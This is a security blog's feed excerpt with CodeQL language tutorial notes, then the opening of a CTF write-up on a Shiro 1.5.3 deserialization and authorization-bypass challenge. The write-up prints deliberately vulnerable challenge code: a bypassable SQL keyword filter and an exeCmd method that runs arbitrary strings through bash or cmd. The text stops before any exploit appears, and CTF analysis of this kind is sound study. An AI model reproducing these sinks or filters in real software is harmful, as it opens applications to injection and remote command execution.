class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">class OneTwo extends OneTwoThree &#123;</span><br><span class="line">    OneTwo() &#123;</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override string getAString() &#123;</span><br><span class="line">        result &#x3D; &quot;One or two: &quot; + this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class OneTwoThree extends int &#123;</span><br><span class="line">    OneTwoThree() &#123;</span><br><span class="line">    &#x2F;&#x2F; characteristic predicate</span><br><span class="line">        this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3 or this &#x3D; 4</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string getAString() &#123;</span><br><span class="line">    &#x2F;&#x2F; member predicate</span><br><span class="line">        result &#x3D; &quot;One, two or three: &quot; + this.toString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    predicate isEven() &#123;</span><br><span class="line">    &#x2F;&#x2F; member predicate</span><br><span class="line">        this &#x3D; 1</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">class TwoThree extends OneTwoThree &#123;</span><br><span class="line">    TwoThree() &#123;</span><br><span class="line">        this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override string getAString() &#123;</span><br><span class="line">        result &#x3D; &quot;Two or three: &quot; + this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from OneTwoThree x</span><br><span class="line">select x, x.getAString()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//36u50er36ec/36u50er36ec.png" alt="image-20210315205036789"></p><hr><h3 id="Multiple-inheritance¶多重继承"><a href="#Multiple-inheritance¶多重继承" class="headerlink" title="Multiple inheritance¶多重继承"></a>Multiple inheritance<a href="https://codeql.github.com/docs/ql-language-reference/types/#multiple-inheritance" target="_blank" rel="noopener">¶</a>多重继承</h3><p>A class can extend multiple types. In that case, it inherits from all those types.</p><blockquote><p>类可以扩展多种类型。在这种情况下，它继承了所有这些类型。</p></blockquote><p>For example, using the definitions from the above section:</p><blockquote><p>例如，使用上面的定义。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class Two extends OneTwo, TwoThree &#123;&#125;</span><br></pre></td></tr></table></figure><p>Any value in the class <code>Two</code> must satisfy the logical property represented by <code>OneTwo</code>, <strong>and</strong> the logical property represented by <code>TwoThree</code>. Here the class <code>Two</code> contains one value, namely 2.</p><blockquote><p>类 Two 中的任何值都必须满足 OneTwo 表示的逻辑属性和 TwoThree 表示的逻<br>辑属性。这里，类 Two 包含一个值，即 2。</p></blockquote><p>It inherits member predicates from <code>OneTwo</code> and <code>TwoThree</code>. It also (indirectly) inherits from <code>OneTwoThree</code> and <code>int</code>.</p><blockquote><p>它从 OneTwo 和 TwoThree 继承成员谓词。它还(间接)继承了 OneTwoThree 和<br>int。</p></blockquote><blockquote><p>注意<br>如果一个子类继承了同一谓词名称的多个定义，那么它必须重写这些定义以避<br>免歧义。在这种情况下，超级表达式通常很有用。</p></blockquote><hr><p>参考：<a href="https://codeql.github.com/docs/ql-language-reference/types/" target="_blank" rel="noopener">https://codeql.github.com/docs/ql-language-reference/types/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Type&quot;&gt;&lt;a href=&quot;#Type&quot; class=&quot;headerlink&quot; title=&quot;Type&quot;&gt;&lt;/a&gt;Type&lt;/h2&gt;&lt;p&gt;QL is a statically typed language, so each variable must have 
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Predicates</title>
    <link href="https://summersec.github.io/2021/03/15/Predicates/"/>
    <id>https://summersec.github.io/2021/03/15/Predicates/</id>
    <published>2021-03-15T00:22:16.000Z</published>
    <updated>2021-03-20T08:30:37.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Predicates–谓词"><a href="#Predicates–谓词" class="headerlink" title="Predicates–谓词"></a>Predicates–谓词</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><a href="https://codeql.github.com/docs/ql-language-reference/predicates/" target="_blank" rel="noopener">官方</a>给出的定义</p><blockquote><p><code>Predicates are used to describe the logical relations that make up a QL program.</code></p></blockquote><blockquote><p>谓词用于描述组成QL程序的逻辑关系。</p></blockquote><hr><h3 id="定义谓词"><a href="#定义谓词" class="headerlink" title="定义谓词"></a>定义谓词</h3><p>在定义谓词时，官方要求：</p><ol><li>关键字（用于<a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates-without-result" target="_blank" rel="noopener">无结果的谓词</a>）或结果类型（用于<a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates-with-result" target="_blank" rel="noopener">结果的谓词</a>）。<code>predicate</code></li><li>谓词的名称。这是一个<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#identifiers" target="_blank" rel="noopener">标识符</a>，以小写字母开始。</li><li>谓词的参数（如果有的话）被逗号隔开。对于每个参数，指定参数类型和参数变量的标识符。</li><li>谓词体本身。这是一个逻辑公式，封闭在括号中。</li></ol><blockquote><p>个人理解其实就是Java、C等语言中的方法或者函数（初步来看，但可以有其特殊性）</p></blockquote><p>注意（之后在看）</p><p><a href="https://codeql.github.com/docs/ql-language-reference/annotations/#abstract" target="_blank" rel="noopener">抽象</a>或<a href="https://codeql.github.com/docs/ql-language-reference/annotations/#external" target="_blank" rel="noopener">外部</a>谓词没有身体。要定义这样的谓词，则用分号 （） 结束谓词定义。<code>;</code></p><hr><h3 id="Predicates-without-result–没有结果谓词"><a href="#Predicates-without-result–没有结果谓词" class="headerlink" title="Predicates without result–没有结果谓词"></a>Predicates without result–没有结果谓词</h3><p>以关键字<code>predicate</code>开头，如果传入的值满足条件就拥有该值。</p><p><a href="Predicates.ql">Predicates.ql</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">predicate isSmall(int i) &#123;</span><br><span class="line">    i in [1 .. 9]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from int x</span><br><span class="line">where x &#x3D; 2 and isSmall(x) &#x2F;&#x2F; x &#x3D; 40</span><br><span class="line">select x</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//18u38er18ec/18u38er18ec.png" alt="image-20210311163818016"></p><hr><h3 id="Predicates-with-result-–-结果谓词"><a href="#Predicates-with-result-–-结果谓词" class="headerlink" title="Predicates with result – 结果谓词"></a>Predicates with result – 结果谓词</h3><p>You can define a predicate with result by replacing the keyword with the type of the result. This introduces the special variable .<code>predicateresult</code></p><p>通过将关键字替换为结果类型来定义结果的谓词。这里引入特殊的变量<code>predicateresult</code>。</p><p><a href="Predicates1.ql">Predicates1.ql</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">int getSuccessor(int i) &#123;</span><br><span class="line">    result &#x3D; i + 1 and &#x2F;&#x2F; i&#x3D;3</span><br><span class="line">    i in [1 .. 9] &#x2F;&#x2F; i&#x3D;2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from int x</span><br><span class="line">where x &#x3D; 2 </span><br><span class="line">select getSuccessor(x) &#x2F;&#x2F;x &#x3D;3</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 3</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//11u53er11ec/11u53er11ec.png" alt="image-20210311165311442"></p><p>结果谓词可以定义一个或多个值</p><p>官方文档:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">  country &#x3D; &quot;France&quot; and result &#x3D; &quot;Belgium&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;France&quot; and result &#x3D; &quot;Germany&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;Germany&quot; and result &#x3D; &quot;Austria&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;Germany&quot; and result &#x3D; &quot;Belgium&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种情况下：</p><ul><li>谓词调用返回两个结果：和.<code>getANeighbor(&quot;Germany&quot;)``&quot;Austria&quot;``&quot;Belgium&quot;</code></li><li>谓词调用不返回任何结果，因为没有定义一个。<code>.getANeighbor(&quot;Belgium&quot;)``getANeighbor``result``&quot;Belgium&quot;</code></li></ul><hr><h3 id="Recursive-predicates–递归谓词"><a href="#Recursive-predicates–递归谓词" class="headerlink" title="Recursive predicates–递归谓词"></a>Recursive predicates–递归谓词</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">    country &#x3D; &quot;France&quot; and result &#x3D; &quot;Belgium&quot; </span><br><span class="line">    or</span><br><span class="line">    country &#x3D; &quot;France&quot; and result &#x3D; &quot;Germany&quot;</span><br><span class="line">    or</span><br><span class="line">    country &#x3D; &quot;Germany&quot; and result &#x3D; &quot;Austria&quot;</span><br><span class="line">    or</span><br><span class="line">    country &#x3D; &quot;Germany&quot; and result &#x3D; &quot;Belgium&quot;</span><br><span class="line">    or</span><br><span class="line">    country &#x3D; getANeighbor(result)</span><br><span class="line">&#125;</span><br><span class="line">select getANeighbor(&quot;Belgium&quot;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;大致流程（个人推断）14（country&#x3D;Belgium）-&gt;4（country&#x3D;Belgium）-&gt;6（country&#x3D;Belgium）-&gt;8（country&#x3D;Belgium）-&gt;10（country&#x3D;Belgium）-&gt;12（country&#x3D;Belgium）-&gt;4（country&#x3D;France）输出-&gt;6（country&#x3D;Germany）输出</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//44u18er44ec/44u18er44ec.png" alt="image-20210312171843940"></p><p>更多解释可以参考<a href="https://codeql.github.com/docs/ql-language-reference/recursion/#recursion" target="_blank" rel="noopener">递归</a></p><hr><h2 id="Kinds-of-predicates-—谓词的种类"><a href="#Kinds-of-predicates-—谓词的种类" class="headerlink" title="Kinds of predicates —谓词的种类"></a>Kinds of predicates —谓词的种类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int getSuccessor(int i) &#123;  &#x2F;&#x2F; 1. Non-member predicate 非成员谓词</span><br><span class="line">  result &#x3D; i + 1 and</span><br><span class="line">  i in [1 .. 9]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FavoriteNumbers extends int &#123;</span><br><span class="line">  FavoriteNumbers() &#123;  &#x2F;&#x2F; 2. Characteristic predicate 特征谓词</span><br><span class="line">    this &#x3D; 1 or</span><br><span class="line">    this &#x3D; 4 or</span><br><span class="line">    this &#x3D; 9</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string getName() &#123;   &#x2F;&#x2F; 3. Member predicate for the class FavoriteNumbers 成员谓词</span><br><span class="line">    this &#x3D; 1 and result &#x3D; &quot;one&quot;</span><br><span class="line">    or</span><br><span class="line">    this &#x3D; 4 and result &#x3D; &quot;four&quot;</span><br><span class="line">    or</span><br><span class="line">    this &#x3D; 9 and result &#x3D; &quot;nine&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Predicates–谓词&quot;&gt;&lt;a href=&quot;#Predicates–谓词&quot; class=&quot;headerlink&quot; title=&quot;Predicates–谓词&quot;&gt;&lt;/a&gt;Predicates–谓词&lt;/h2&gt;&lt;h3 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; cla
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Queries</title>
    <link href="https://summersec.github.io/2021/03/14/Queries/"/>
    <id>https://summersec.github.io/2021/03/14/Queries/</id>
    <published>2021-03-14T00:22:16.000Z</published>
    <updated>2021-03-20T08:31:01.914Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Queries-–-查询"><a href="#Queries-–-查询" class="headerlink" title="Queries – 查询"></a>Queries – 查询</h2><p>Queries are the output of a QL program. They evaluate to sets of results.</p><blockquote><p>Queries是QL程序的输出，执行的结果集合。</p></blockquote><p>There are two kinds of queries. For a given <a href="https://codeql.github.com/docs/ql-language-reference/modules/#query-modules" target="_blank" rel="noopener">query module</a>, the queries in that module are:</p><blockquote><p>有两种Queries。对于给定的<a href="https://codeql.github.com/docs/ql-language-reference/modules/#query-modules" target="_blank" rel="noopener">查询模块</a>，该模块中的查询是</p></blockquote><ul><li><p>The <a href="https://codeql.github.com/docs/ql-language-reference/queries/#select-clauses" target="_blank" rel="noopener">select clause</a>, if any, defined in that module.</p></li><li><blockquote><p>select 子句（如果有的话）在该模块中定义。</p></blockquote></li><li><p>Any <a href="https://codeql.github.com/docs/ql-language-reference/queries/#query-predicates" target="_blank" rel="noopener">query predicates</a> in that module’s predicate <a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#namespaces" target="_blank" rel="noopener">namespace</a>. That is, they can be defined in the module itself, or imported from a different module.</p></li><li><blockquote><p>在该模块的谓词空间中的任何查询谓词，也就是说，它们可以在模块本身定义，也可以从其他模块导入</p></blockquote></li></ul><p>We often also refer to the whole QL program as a query.</p><blockquote><p>通常也把整个QL程序称为查询。</p></blockquote><hr><h3 id="Select-clauses"><a href="#Select-clauses" class="headerlink" title="Select clauses"></a>Select clauses</h3><p>When writing a query module, you can include a <strong>select clause</strong> (usually at the end of the file) of the following form:</p><blockquote><p>在编写查询模块时，你可以包含一个<strong>选择子句</strong>（通常在文件的末尾），其形式如下:</p><p>(from 和 where 部分可以省略)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from &#x2F;* ... variable declarations ... *&#x2F;</span><br><span class="line">where &#x2F;* ... logical formula ... *&#x2F;</span><br><span class="line">select &#x2F;* ... expressions ... *&#x2F;</span><br></pre></td></tr></table></figure><p>Apart from the expressions described in “<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#expressions" target="_blank" rel="noopener">Expressions</a>,” you can also include:</p><blockquote><p>除了 “表达式 “中描述的表达式外，你还可以包括:</p></blockquote><ul><li><p>The <code>as</code> keyword, followed by a name. This gives a “label” to a column of results, and allows you to use them in subsequent select expressions.</p></li><li><blockquote><p><code>as</code>关键字，后面跟着一个名字。这给一列结果打上了 “标签”，并允许你在随后的选择表达式中使用它们。</p></blockquote></li><li><p>The <code>order by</code> keywords, followed by the name of a result column, and optionally the keyword <code>asc</code> or <code>desc</code>. This determines the order in which to display the results.</p></li><li><blockquote><p>ORDER BY关键字，后跟结果列的名称，还可以选择关键字<code>asc</code>或<code>desc</code> 。这决定了显示结果的顺序。</p></blockquote></li></ul><p><a href="./Queries.ql">Queries.ql</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from int x, int y</span><br><span class="line">where x &#x3D; 3 and y in [0 .. 2]</span><br><span class="line">select x, y, x * y as product, &quot;product: &quot; + product</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//33u44er33ec/33u44er33ec.png" alt="image-20210314144433274"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from int x, int y</span><br><span class="line">where x &#x3D; 3 and y in [0 .. 2]</span><br><span class="line">select x, y, x * y as product, &quot;product: &quot; + product</span><br><span class="line">as res order by  res desc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//34u47er34ec/34u47er34ec.png" alt="image-20210314144734388"></p><hr><h3 id="Query-predicates-–-查询谓词"><a href="#Query-predicates-–-查询谓词" class="headerlink" title="Query predicates – 查询谓词"></a>Query predicates – 查询谓词</h3><p> A query predicate is a <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#non-member-predicates" target="_blank" rel="noopener">non-member predicate</a> with a <code>query</code> annotation. It returns all the tuples that the predicate evaluates to.</p><blockquote><p>查询谓词是具有查询注释的非成员谓词。 它返回谓词求值的所有元组。</p><p>个人理解。再非成员谓词前面加上一个 <code>query</code>注释就代表这个非成员谓词是要被查询的，如果不加<code>query</code> 注释就会报错</p></blockquote><p><a href="./Queries1.ql">Queries1.ql</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query int getProduct(int x, int y) &#123;</span><br><span class="line">  x &#x3D; 3 and</span><br><span class="line">  y in [0 .. 2] and</span><br><span class="line">  result &#x3D; x * y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//30u51er30ec/30u51er30ec.png" alt="image-20210314145130939"></p><p>A benefit of writing a query predicate instead of a select clause is that you can call the predicate in other parts of the code too. For example, you can call <code>getProduct</code> inside the body of a <a href="https://codeql.github.com/docs/ql-language-reference/types/#classes" target="_blank" rel="noopener">class</a>:</p><blockquote><p>编写查询谓词而不是选择子句(select clause)的一个好处是，你也可以在代码的其他部分调用该谓词。</p></blockquote><p><a href="./Queries2.ql">Queries2.ql</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">query int getProduct(int x, int y) &#123;</span><br><span class="line">    x &#x3D; 4 and</span><br><span class="line">    y in [0 .. 3] and</span><br><span class="line">    result &#x3D; x * y</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">class MultipleOfThree extends int &#123;</span><br><span class="line">    MultipleOfThree() &#123; this &#x3D; getProduct(_, _) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//49u57er49ec/49u57er49ec.png" alt="image-20210314145749808"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Queries-–-查询&quot;&gt;&lt;a href=&quot;#Queries-–-查询&quot; class=&quot;headerlink&quot; title=&quot;Queries – 查询&quot;&gt;&lt;/a&gt;Queries – 查询&lt;/h2&gt;&lt;p&gt;Queries are the output of a QL
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>一道shiro反序列化题目引发的思考</title>
    <link href="https://summersec.github.io/2021/03/05/%E4%B8%80%E9%81%93shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://summersec.github.io/2021/03/05/%E4%B8%80%E9%81%93shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2021-03-05T00:22:16.000Z</published>
    <updated>2021-03-18T03:58:22.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发：<a href="https://www.anquanke.com/post/id/231488" target="_blank" rel="noopener">https://www.anquanke.com/post/id/231488</a></p><p>&emsp;&emsp; 这是某银行的内部的一个CTF比赛，受邀参加。题目三个关键词<code>权限绕过</code>、<code>shiro</code>、<code>反序列化</code>，题目源码已经被修改，但考察本质没有，题目源码会上传到<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>。</p><hr><h1 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h1><ul><li>xray测试shiro的key</li><li>dirsearch跑目录</li><li>sqlmap测试登陆框是否存在sql注入</li></ul><hr><h1 id="白盒代码审计"><a href="#白盒代码审计" class="headerlink" title="白盒代码审计"></a>白盒代码审计</h1><h2 id="源码初步分析"><a href="#源码初步分析" class="headerlink" title="源码初步分析"></a>源码初步分析</h2><ul><li>版本 shiro == 1.5.3（不存在remember反序列化漏洞，但存在CVE-2020-13933权限绕过漏洞）<br><img src="https://img-blog.csdnimg.cn/20210102135348640.png" alt="在这里插入图片描述"></li></ul><hr><ul><li>shiro验证通过Realm的方式判断用户是否合法，此处重写<code>doGetAuthorizationInfo</code>方法，账户名<code>admin</code>（可能有用）。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        String username = (String)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"admin"</span>.equals(username)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnknownAccountException(<span class="string">"unkown user"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SimpleAuthenticationInfo(username, UUID.randomUUID().toString().replaceAll(<span class="string">"-"</span>, <span class="string">""</span>), getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><ul><li>访问控制权限，可能看到<code>index</code>、<code>dologin</code>存在访问权限。<blockquote><pre><code>* anon：匿名用户可访问* authc：认证用户可访问* user：使用rememberMe可访问* perms：对应权限可访问* role：对应角色权限可访问</code></pre></blockquote></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function">ShiroFilterFactoryBean <span class="title">shiroFilterFactoryBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ShiroFilterFactoryBean bean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line">    bean.setSecurityManager(<span class="keyword">this</span>.securityManager());</span><br><span class="line">    bean.setLoginUrl(<span class="string">"/login"</span>);</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line">    map.put(<span class="string">"/doLogin"</span>, <span class="string">"anon"</span>);</span><br><span class="line">    map.put(<span class="string">"/index/*"</span>, <span class="string">"authc"</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><ul><li><code>SQL注入？</code>第一眼反应感觉可能存在注入漏洞或者是XSS但又想到是CTF比赛，应该是不会考察XSS，所以觉得是SQL注入漏洞，然后用SQLMAP尝试一波注入绕过后，没有发现SQL注入漏洞。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">filter</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        String[] keyWord = <span class="keyword">new</span> String[]&#123;<span class="string">"'"</span>, <span class="string">"\""</span>, <span class="string">"select"</span>, <span class="string">"union"</span>, <span class="string">"/;"</span>, <span class="string">"/%3b"</span>&#125;;</span><br><span class="line">        String[] var3 = keyWord;</span><br><span class="line">        <span class="keyword">int</span> var4 = keyWord.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            String i = var3[var5];</span><br><span class="line">            param = param.replaceAll(i, <span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><ul><li>远程命令执行？翻遍代码发现调用<code>exeCmd</code>方法只有<code>LogHandler</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exeCmd</span><span class="params">(String commandStr)</span> </span>&#123;</span><br><span class="line">        BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">        String OS = System.getProperty(<span class="string">"os.name"</span>).toLowerCase();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process p = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (OS.startsWith(<span class="string">"win"</span>))&#123;</span><br><span class="line">                p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>, <span class="string">"/c"</span>, commandStr&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, commandStr&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">"\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="灰盒测试"><a href="#灰盒测试" class="headerlink" 